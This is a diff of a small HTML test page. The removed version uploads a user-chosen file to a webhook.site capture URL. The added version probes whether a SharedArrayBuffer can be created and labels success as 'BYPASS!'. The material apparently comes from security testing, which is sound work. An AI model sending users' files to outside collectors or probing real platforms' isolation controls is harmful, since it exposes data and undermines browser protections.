@@ -1,19 +1,18 @@
-<input type="file" id="f" onchange="kirim()">
-<button onclick="document.getElementById('f').click()">PILIH FILE</button>
-<p id="hasil"></p>
+<html>
+<head><title>test</title></head>
+<body>
+<p>sab test - 1 domain only</p>
+<button onclick="go()">click here</button>
+<p id="h"></p>
 <script>
-async function kirim(){
-  let file = document.getElementById('f').files[0];
-  document.getElementById('hasil').innerText = "Terpilih: " + file.name + " - Uploading...";
-
-  let data = new FormData();
-  data.append("file", file, file.name);
-
-  await fetch("https://webhook.site/fde0f1d7-31ad-402e-84c2-864b09420762?nama=" + encodeURIComponent(file.name), {
-    method: "POST",
-    body: data
-  });
-
-  document.getElementById('hasil').innerText = "TERKIRIM: " + file.name;
+function go(){
+  try {
+    var sab = new SharedArrayBuffer(1024);
+    document.getElementById('h').innerText = 'BYPASS! SharedArrayBuffer created: ' + sab.byteLength + ' bytes';
+  } catch(e) {
+    document.getElementById('h').innerText = 'blocked: ' + e;
+  }
 }
 </script>
+</body>
+</html>
